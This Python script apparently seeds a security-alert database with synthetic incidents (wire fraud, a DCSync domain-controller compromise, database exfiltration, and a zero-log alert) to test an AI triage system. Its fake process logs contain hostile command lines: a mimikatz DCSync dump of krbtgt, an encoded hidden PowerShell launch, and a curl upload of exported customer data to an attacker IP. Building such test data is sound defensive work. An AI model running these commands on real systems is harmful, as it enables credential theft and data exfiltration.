"""
COMPREHENSIVE INFRASTRUCTURE-BASED ALERT GENERATOR
===================================================
Uses TechCorp company infrastructure to generate realistic alerts.

FEATURES:
1. Every alert has ALL 4 log types (network, process, file, windows)
2. Creates "orphan" alert with NO logs to test AI fallback
3. Uses real employee names, IPs, hostnames from company_infrastructure.json
4. Realistic attack scenarios based on department roles

GUARANTEES:
- 100% log coverage (every alert has network + process + file + windows logs)
- Tests AI behavior with zero-log scenario
- Correlated forensic data for investigation
"""

import sys
import os
import json
from datetime import datetime, timedelta
from pathlib import Path
import random

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from dotenv import load_dotenv
load_dotenv()

from supabase import create_client

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_SERVICE_KEY = os.getenv("SUPABASE_SERVICE_KEY")
supabase = create_client(SUPABASE_URL, SUPABASE_SERVICE_KEY)

# Load company infrastructure
infra_path = Path(__file__).parent / "backend" / "core" / "sample_data" / "company_infrastructure.json"
with open(infra_path, 'r') as f:
    INFRASTRUCTURE = json.load(f)

print("="*70)
print("INFRASTRUCTURE-BASED ALERT GENERATOR")
print("="*70)
print(f"Loaded infrastructure: {INFRASTRUCTURE['company_info']['name']}")
print(f"Employees: {len(INFRASTRUCTURE['employees'])}")
print(f"Servers: {len(INFRASTRUCTURE['servers'])}")
print("="*70)

# ===========================================================================
# SCENARIO 1: Finance Manager - Wire Transfer Fraud Attempt
# ===========================================================================
def generate_wire_transfer_fraud():
    """Attacker attempts unauthorized wire transfer using finance manager account"""
    print("\n[1] Generating: Wire Transfer Fraud Attempt")
    
    # Use john.doe (Finance Manager) - high value target
    employee = INFRASTRUCTURE['employees'][0]  # john.doe
    attacker_ip = INFRASTRUCTURE['external_threats']['known_bad_ips'][0]
    
    timestamp = datetime.now().isoformat()
    
    alert = {
        "alert_name": "Unauthorized Wire Transfer Attempt - Finance Account",
        "source_ip": employee['real_ip'],
        "dest_ip": attacker_ip,
        "hostname": employee['real_hostname'],
        "username": employee['real_name'],
        "mitre_technique": "T1537",  # Transfer Data to Cloud Account
        "severity": "critical",
        "severity_class": "CRITICAL_HIGH",
        "timestamp": timestamp,
        "description": f"Finance Manager account ({employee['real_name']}) attempted wire transfer to suspicious external account during off-hours. Transfer amount: $4.8M. IP geolocation shows access from unusual country.",
        "status": "open",
        "created_at": timestamp
    }
    
    result = supabase.table('alerts').insert(alert).execute()
    alert_id = result.data[0]['id']
    print(f"  [OK] Alert ID: {alert_id[:16]}...")
    
    # NETWORK LOGS - Wire transfer portal access
    network_logs = [
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "source_ip": employee['real_ip'],
            "dest_ip": "52.10.45.200",  # Banking portal
            "dest_port": 443,
            "protocol": "TCP",
            "bytes_sent": 15000,
            "bytes_received": 8500,
            "connection_state": "ESTABLISHED",
            "service": "https",
            "log_source": "Zeek"
        },
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "source_ip": employee['real_ip'],
            "dest_ip": attacker_ip,
            "dest_port": 443,
            "protocol": "TCP",
            "bytes_sent": 2300,
            "bytes_received": 5600,
            "connection_state": "ESTABLISHED",
            "service": "https",
            "log_source": "Zeek"
        }
    ]
    supabase.table('network_logs').insert(network_logs).execute()
    
    # PROCESS LOGS - Browser and suspicious script execution
    process_logs = [
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "process_name": "chrome.exe",
            "command_line": "chrome.exe --profile-directory=Default https://wirebank.portal.com/transfer",
            "username": employee['real_name'],
            "hostname": employee['real_hostname'],
            "parent_process": "explorer.exe",
            "event_id": "1",
            "log_source": "Sysmon"
        },
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\validate_transfer.ps1",
            "username": employee['real_name'],
            "hostname": employee['real_hostname'],
            "parent_process": "chrome.exe",
            "event_id": "1",
            "log_source": "Sysmon"
        }
    ]
    supabase.table('process_logs').insert(process_logs).execute()
    
    # FILE LOGS - Downloaded suspicious validation script
    file_logs = [
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "action": "FileCreate",
            "file_path": "C:\\Temp\\validate_transfer.ps1",
            "file_name": "validate_transfer.ps1",
            "file_extension": ".ps1",
            "process_name": "chrome.exe",
            "username": employee['real_name'],
            "log_source": "Sysmon"
        },
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "action": "FileCreate",
            "file_path": "C:\\Users\\john.doe\\Downloads\\wire_transfer_template.xlsx",
            "file_name": "wire_transfer_template.xlsx",
            "file_extension": ".xlsx",
            "process_name": "chrome.exe",
            "username": employee['real_name'],
            "log_source": "Sysmon"
        }
    ]
    supabase.table('file_activity_logs').insert(file_logs).execute()
    
    # WINDOWS LOGS - Failed authentication + privilege escalation attempt
    windows_logs = [
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "event_id": "4625",
            "event_type": "Failed Logon",
            "log_name": "Security",
            "username": employee['real_name'],
            "hostname": employee['real_hostname'],
            "source_ip": employee['real_ip']
        },
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "event_id": "4672",
            "event_type": "Special privileges assigned to new logon",
            "log_name": "Security",
            "username": employee['real_name'],
            "hostname": employee['real_hostname'],
            "source_ip": employee['real_ip']
        }
    ]
    supabase.table('windows_event_logs').insert(windows_logs).execute()
    
    print(f"  [OK] Network logs: {len(network_logs)}")
    print(f"  [OK] Process logs: {len(process_logs)}")
    print(f"  [OK] File logs: {len(file_logs)}")
    print(f"  [OK] Windows logs: {len(windows_logs)}")
    
    return alert_id

# ===========================================================================
# SCENARIO 2: IT Admin - Domain Controller Compromise
# ===========================================================================
def generate_domain_controller_attack():
    """Attacker compromises IT admin account to access domain controller"""
    print("\n[2] Generating: Domain Controller Compromise")
    
    # Use sarah.smith (IT Admin) + DC-PRIMARY-01 server
    employee = INFRASTRUCTURE['employees'][1]  # sarah.smith
    dc_server = INFRASTRUCTURE['servers'][6]  # DC-PRIMARY-01
    attacker_ip = INFRASTRUCTURE['external_threats']['known_bad_ips'][1]
    
    timestamp = datetime.now().isoformat()
    
    alert = {
        "alert_name": "Domain Controller - Suspicious Admin Activity",
        "source_ip": employee['real_ip'],
        "dest_ip": dc_server['real_ip'],
        "hostname": employee['real_hostname'],
        "username": employee['real_name'],
        "mitre_technique": "T1003.006",  # OS Credential Dumping: DCSync
        "severity": "critical",
        "severity_class": "CRITICAL_HIGH",
        "timestamp": timestamp,
        "description": f"IT Admin account ({employee['real_name']}) initiated DCSync attack against Domain Controller. Attempted to extract domain credentials including KRBTGT hash. This enables Golden Ticket creation.",
        "status": "open",
        "created_at": timestamp
    }
    
    result = supabase.table('alerts').insert(alert).execute()
    alert_id = result.data[0]['id']
    print(f"  [OK] Alert ID: {alert_id[:16]}...")
    
    # NETWORK LOGS - DCSync replication traffic
    network_logs = [
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "source_ip": employee['real_ip'],
            "dest_ip": dc_server['real_ip'],
            "dest_port": 135,  # RPC
            "protocol": "TCP",
            "bytes_sent": 3400,
            "bytes_received": 185000,  # Large data exfiltration
            "connection_state": "ESTABLISHED",
            "service": "ms-rpc",
            "log_source": "Zeek"
        },
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "source_ip": employee['real_ip'],
            "dest_ip": dc_server['real_ip'],
            "dest_port": 389,  # LDAP
            "protocol": "TCP",
            "bytes_sent": 1200,
            "bytes_received": 95000,
            "connection_state": "ESTABLISHED",
            "service": "ldap",
            "log_source": "Zeek"
        }
    ]
    supabase.table('network_logs').insert(network_logs).execute()
    
    # PROCESS LOGS - Mimikatz DCSync
    process_logs = [
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "process_name": "mimikatz.exe",
            "command_line": "mimikatz.exe lsadump::dcsync /domain:techcorp.local /user:krbtgt",
            "username": employee['real_name'],
            "hostname": employee['real_hostname'],
            "parent_process": "powershell.exe",
            "event_id": "1",
            "log_source": "Sysmon"
        },
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -NoP -W Hidden -Enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
            "username": employee['real_name'],
            "hostname": employee['real_hostname'],
            "parent_process": "cmd.exe",
            "event_id": "1",
            "log_source": "Sysmon"
        }
    ]
    supabase.table('process_logs').insert(process_logs).execute()
    
    # FILE LOGS - Credential dump output
    file_logs = [
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "action": "FileCreate",
            "file_path": "C:\\Users\\sarah.smith\\AppData\\Local\\Temp\\dcsync_output.txt",
            "file_name": "dcsync_output.txt",
            "file_extension": ".txt",
            "process_name": "mimikatz.exe",
            "username": employee['real_name'],
            "log_source": "Sysmon"
        },
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "action": "FileModify",
            "file_path": "C:\\Windows\\System32\\ntds.dit",
            "file_name": "ntds.dit",
            "file_extension": ".dit",
            "process_name": "System",
            "username": "SYSTEM",
            "log_source": "Sysmon"
        }
    ]
    supabase.table('file_activity_logs').insert(file_logs).execute()
    
    # WINDOWS LOGS - Directory service access
    windows_logs = [
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "event_id": "4662",
            "event_type": "An operation was performed on an object",
            "log_name": "Security",
            "username": employee['real_name'],
            "hostname": dc_server['real_hostname'],
            "source_ip": employee['real_ip']
        },
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "event_id": "4624",
            "event_type": "Successful Logon",
            "log_name": "Security",
            "username": employee['real_name'],
            "hostname": dc_server['real_hostname'],
            "source_ip": employee['real_ip']
        }
    ]
    supabase.table('windows_event_logs').insert(windows_logs).execute()
    
    print(f"  [OK] Network logs: {len(network_logs)}")
    print(f"  [OK] Process logs: {len(process_logs)}")
    print(f"  [OK] File logs: {len(file_logs)}")
    print(f"  [OK] Windows logs: {len(windows_logs)}")
    
    return alert_id

# ===========================================================================
# SCENARIO 3: Database Exfiltration from Production DB
# ===========================================================================
def generate_database_exfiltration():
    """Attacker exfiltrates customer data from primary database"""
    print("\n[3] Generating: Database Exfiltration")
    
    # Use james.wilson (Engineering Lead) + DB-PRIMARY-01
    employee = INFRASTRUCTURE['employees'][6]  # james.wilson
    db_server = INFRASTRUCTURE['servers'][0]  # DB-PRIMARY-01
    attacker_ip = INFRASTRUCTURE['external_threats']['known_bad_ips'][2]
    
    timestamp = datetime.now().isoformat()
    
    alert = {
        "alert_name": "Mass Database Export - Customer Data Exfiltration",
        "source_ip": employee['real_ip'],
        "dest_ip": db_server['real_ip'],
        "hostname": employee['real_hostname'],
        "username": employee['real_name'],
        "mitre_technique": "T1530",  # Data from Cloud Storage Object
        "severity": "critical",
        "severity_class": "CRITICAL_HIGH",
        "timestamp": timestamp,
        "description": f"Engineering Lead account ({employee['real_name']}) performed full database dump of production customer database. 1.2M records exported. Unusual query pattern detected: SELECT * FROM customers, financial_records, transactions.",
        "status": "open",
        "created_at": timestamp
    }
    
    result = supabase.table('alerts').insert(alert).execute()
    alert_id = result.data[0]['id']
    print(f"  [OK] Alert ID: {alert_id[:16]}...")
    
    # NETWORK LOGS - Database queries + external transfer
    network_logs = [
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "source_ip": employee['real_ip'],
            "dest_ip": db_server['real_ip'],
            "dest_port": 5432,  # PostgreSQL
            "protocol": "TCP",
            "bytes_sent": 5600,
            "bytes_received": 2800000,  # 2.8MB of data
            "connection_state": "ESTABLISHED",
            "service": "postgresql",
            "log_source": "Zeek"
        },
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "source_ip": employee['real_ip'],
            "dest_ip": attacker_ip,
            "dest_port": 443,
            "protocol": "TCP",
            "bytes_sent": 2850000,  # Upload stolen data
            "bytes_received": 450,
            "connection_state": "ESTABLISHED",
            "service": "https",
            "log_source": "Zeek"
        }
    ]
    supabase.table('network_logs').insert(network_logs).execute()
    
    # PROCESS LOGS - Database tools
    process_logs = [
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "process_name": "psql.exe",
            "command_line": "psql.exe -h 10.20.10.5 -U james.wilson -d production -c \"COPY (SELECT * FROM customers) TO '/tmp/export.csv'\"",
            "username": employee['real_name'],
            "hostname": employee['real_hostname'],
            "parent_process": "cmd.exe",
            "event_id": "1",
            "log_source": "Sysmon"
        },
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "process_name": "curl.exe",
            "command_line": f"curl.exe -X POST -F file=@export.csv https://{attacker_ip}/upload",
            "username": employee['real_name'],
            "hostname": employee['real_hostname'],
            "parent_process": "cmd.exe",
            "event_id": "1",
            "log_source": "Sysmon"
        }
    ]
    supabase.table('process_logs').insert(process_logs).execute()
    
    # FILE LOGS - Database export files
    file_logs = [
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "action": "FileCreate",
            "file_path": "C:\\Temp\\export.csv",
            "file_name": "export.csv",
            "file_extension": ".csv",
            "process_name": "psql.exe",
            "username": employee['real_name'],
            "log_source": "Sysmon"
        },
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "action": "FileDelete",
            "file_path": "C:\\Temp\\export.csv",
            "file_name": "export.csv",
            "file_extension": ".csv",
            "process_name": "cmd.exe",
            "username": employee['real_name'],
            "log_source": "Sysmon"
        }
    ]
    supabase.table('file_activity_logs').insert(file_logs).execute()
    
    # WINDOWS LOGS - High privilege database access
    windows_logs = [
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "event_id": "4663",
            "event_type": "An attempt was made to access an object",
            "log_name": "Security",
            "username": employee['real_name'],
            "hostname": employee['real_hostname'],
            "source_ip": employee['real_ip']
        },
        {
            "alert_id": alert_id,
            "timestamp": timestamp,
            "event_id": "5145",
            "event_type": "A network share object was checked to see whether client can be granted desired access",
            "log_name": "Security",
            "username": employee['real_name'],
            "hostname": employee['real_hostname'],
            "source_ip": employee['real_ip']
        }
    ]
    supabase.table('windows_event_logs').insert(windows_logs).execute()
    
    print(f"  [OK] Network logs: {len(network_logs)}")
    print(f"  [OK] Process logs: {len(process_logs)}")
    print(f"  [OK] File logs: {len(file_logs)}")
    print(f"  [OK] Windows logs: {len(windows_logs)}")
    
    return alert_id

# ===========================================================================
# SCENARIO 4: ZERO LOG ALERT - Test AI Fallback
# ===========================================================================
def generate_zero_log_alert():
    """Alert with NO logs to test AI fallback behavior"""
    print("\n[4] Generating: Zero-Log Alert (AI Fallback Test)")
    
    timestamp = datetime.now().isoformat()
    
    alert = {
        "alert_name": "Generic Security Alert - No Forensic Data",
        "source_ip": "10.20.5.99",
        "dest_ip": "203.0.113.99",
        "hostname": "UNKNOWN-HOST",
        "username": "unknown_user",
        "mitre_technique": "T1071.001",  # Application Layer Protocol: Web Protocols
        "severity": "medium",
        "severity_class": "MEDIUM",
        "timestamp": timestamp,
        "description": "Anomalous network traffic detected to suspicious external IP. No detailed forensic logs available. Alert triggered by IDS signature match only.",
        "status": "open",
        "created_at": timestamp
    }
    
    result = supabase.table('alerts').insert(alert).execute()
    alert_id = result.data[0]['id']
    print(f"  [OK] Alert ID: {alert_id[:16]}...")
    print(f"  [OK] Network logs: 0 (INTENTIONAL)")
    print(f"  [OK] Process logs: 0 (INTENTIONAL)")
    print(f"  [OK] File logs: 0 (INTENTIONAL)")
    print(f"  [OK] Windows logs: 0 (INTENTIONAL)")
    print(f"  -> Testing AI behavior with NO context")
    
    return alert_id

# ===========================================================================
# MAIN EXECUTION
# ===========================================================================
def main():
    print("\n" + "="*70)
    print("GENERATING INFRASTRUCTURE-BASED ALERTS")
    print("="*70)
    
    alert_ids = []
    
    # Generate alerts with FULL log coverage
    alert_ids.append(generate_wire_transfer_fraud())
    alert_ids.append(generate_domain_controller_attack())
    alert_ids.append(generate_database_exfiltration())
    
    # Generate zero-log alert
    alert_ids.append(generate_zero_log_alert())
    
    print("\n" + "="*70)
    print("GENERATION COMPLETE")
    print("="*70)
    print(f"\nGenerated {len(alert_ids)} alerts:")
    print(f"  - {len(alert_ids) - 1} with FULL log coverage (all 4 types)")
    print(f"  - 1 with ZERO logs (AI fallback test)")
    
    print("\nAlert IDs:")
    for i, aid in enumerate(alert_ids, 1):
        print(f"  {i}. {aid}")
    
    print("\nNext Steps:")
    print("  1. Backend will analyze all 4 alerts")
    print("  2. Alerts 1-3: AI has full context (network+process+file+windows)")
    print("  3. Alert 4: AI has NO logs - test fallback reasoning")
    print("  4. Check dashboard to see how AI handles both scenarios")
    print("\n" + "="*70 + "\n")

if __name__ == "__main__":
    main()
